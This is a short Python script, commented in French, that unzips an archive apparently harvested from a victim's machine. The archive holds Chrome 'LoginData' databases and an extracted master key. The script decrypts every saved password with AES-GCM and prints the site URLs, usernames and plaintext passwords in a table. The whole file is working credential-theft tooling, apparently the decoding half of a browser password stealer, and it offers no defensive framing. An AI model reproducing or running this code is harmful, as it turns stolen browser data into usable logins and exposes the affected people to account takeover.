import base64
# import json
import os
import shutil
import sqlite3
import zipfile
from colorama import Fore, init
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from prettytable import PrettyTable

# Initialiser Colorama
init(autoreset=True)


def extract_zip(zip_path):
    extracted_folder = "extracted_files"
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extracted_folder)
    return extracted_folder


def find_files(extracted_folder):
    login_data_files = []
    local_state_file = None
    decrypted_key_file = None

    for root, dirs, files in os.walk(extracted_folder):
        for file in files:
            if file.startswith("LoginData"):
                login_data_files.append(os.path.join(root, file))
            elif file == "LocalState" and local_state_file is None:
                local_state_file = os.path.join(root, file)
            elif file == "decrypted_key.txt" and decrypted_key_file is None:
                decrypted_key_file = os.path.join(root, file)

    # Vérification de la présence des fichiers essentiels
    if not login_data_files or not local_state_file or not decrypted_key_file:
        raise FileNotFoundError(
            "Les fichiers LoginData, LocalState ou decrypted_key.txt n'ont pas été trouvés dans le ZIP.")

    return login_data_files, local_state_file, decrypted_key_file


def decrypt_key(zip_extracted_folder):

    # Vérifier que le fichier contenant la clé existe
    if not os.path.exists(zip_extracted_folder):
        raise FileNotFoundError("Le fichier decrypted_key.txt n'a pas été trouvé dans le dossier extrait.")

    # Lire la clé en base64 depuis le fichier et la décoder en binaire
    with open(zip_extracted_folder, "r", encoding="utf-8") as f:
        decrypted_key_base64 = f.read().strip()
    decrypted_key = base64.b64decode(decrypted_key_base64)

    return decrypted_key


def decrypt_password(encrypted_password, key):
    iv = encrypted_password[3:15]
    tag = encrypted_password[-16:]
    encrypted_password = encrypted_password[15:-16]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
    return decrypted_password


def get_passwords(login_data, key, browser="Google Chrome", profile="Default"):
    shutil.copy2(login_data, "login_data.db")
    conn = sqlite3.connect("login_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    table = PrettyTable()
    table.field_names = ["Status", "Browser", "Profile", "URL", "Username", "Decrypted Password", "Error"]

    profile = profile.replace("LoginData_", "Profile ").strip()
    if profile == "Profile 0":
        profile = "Default"

    for url, username, encrypted_password in cursor.fetchall():
        if encrypted_password:
            try:
                decrypted_password = decrypt_password(encrypted_password, key)
                status = "V"
                table.add_row([status, browser, profile, url, username, decrypted_password.decode('utf-8', errors='ignore'), ""])
            except Exception as e:
                status = "X"
                error_message = str(e)
                table.add_row([Fore.YELLOW + status, Fore.YELLOW + browser, Fore.YELLOW + profile, Fore.YELLOW + url, Fore.YELLOW + username, "", Fore.YELLOW + error_message])

    conn.close()
    os.remove("login_data.db")
    return table


def decrypt_passwords(zip_path):
    extracted_folder = extract_zip(zip_path)
    login_data_files, local_state, decrypt_key_path = find_files(extracted_folder)
    key = decrypt_key(decrypt_key_path)

    final_table = PrettyTable()
    final_table.field_names = ["Status", "Browser", "Profile", "URL", "Username", "Decrypted Password", "Error"]

    for login_data in login_data_files:
        # Utiliser le nom du fichier pour le profil
        profile_name = os.path.basename(login_data)
        passwords_table = get_passwords(login_data, key, profile=profile_name)
        final_table.add_rows(passwords_table.rows)

    return final_table


def main():
    zip_path = "chest-PASSWORDS-2024-11-06_03-06.zip"
    passwords_table = decrypt_passwords(zip_path)
    print(passwords_table)


if __name__ == "__main__":
    main()
